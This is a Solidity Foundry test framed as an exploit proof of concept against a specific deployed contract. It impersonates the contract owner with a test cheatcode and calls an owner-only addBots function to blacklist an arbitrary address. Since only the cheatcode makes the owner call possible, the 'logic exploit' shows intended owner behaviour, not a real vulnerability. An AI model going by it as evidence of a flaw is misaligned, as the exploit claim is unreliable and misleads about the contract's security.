// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILPP {
    function owner() external view returns (address);
    function addBots(address[] memory _botAddress, bool _status) external;
    function botlist(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112;
    address attacker = address(this);
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
        victim = address(0x1234567890123456789012345678901234567890);
        vm.label(victim, "Victim Address");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner of the contract
        address contractOwner = ILPP(TARGET).owner();
        vm.label(contractOwner, "Contract Owner");

        // Impersonate the owner
        vm.startPrank(contractOwner);

        // Create array with victim address
        address[] memory botAddresses = new address[](1);
        botAddresses[0] = victim;

        // Call addBots to blacklist the victim
        ILPP(TARGET).addBots(botAddresses, true);

        vm.stopPrank();

        // Verify the exploit worked - victim should be in botlist
        bool isBot = ILPP(TARGET).botlist(victim);
        assertEq(isBot, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

